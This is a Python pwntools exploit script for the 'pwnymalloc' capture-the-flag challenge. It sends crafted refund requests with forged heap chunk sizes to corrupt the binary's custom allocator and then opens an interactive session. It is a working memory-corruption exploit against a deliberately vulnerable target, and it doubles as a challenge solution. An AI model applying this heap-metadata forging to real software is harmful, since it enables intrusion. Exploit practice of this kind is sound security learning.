#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


exe = ELF('./challenge/chal')

host = 'pwnymalloc.chal.uiuc.tf'
port = 1337

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-f', '-h']
context.binary = exe



def conn(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process(exe.path, *a, **kw)

gdbscript = '''
b *main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def complain(io, msg):
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'complaint:\n')
    io.sendline(msg)

def refund_req(io, amt, reason):
    io.recvuntil(b'> ')
    io.sendline(b'3')
    io.recvuntil(b'refunded:\n')
    io.sendline('{}'.format(amt).encode())
    io.recvuntil(b'request:\n')
    io.send(reason)
    
def refund_status(io, req_id):
    io.recvuntil(b'> ')
    io.sendline(b'4')
    io.recvuntil(b'ID:\n')
    io.sendline('{}'.format(req_id).encode())

def solve():
    io = conn()
    
    refund_req(io, 0, b'\0'*0x68 + p64(0x50) + (b'\0'*0x10)[:-1])
    
    refund_req(io, 0, b'\0'*0x78 + p64(0xa8)[:-1])
    
    complain(io, b'A')
    
    refund_req(io, 0, b'\0'*16 + p32(1) + p32(1) + b'\n')
    
    refund_status(io, 1)
    
    io.interactive()
    
if __name__ == "__main__":
    solve()

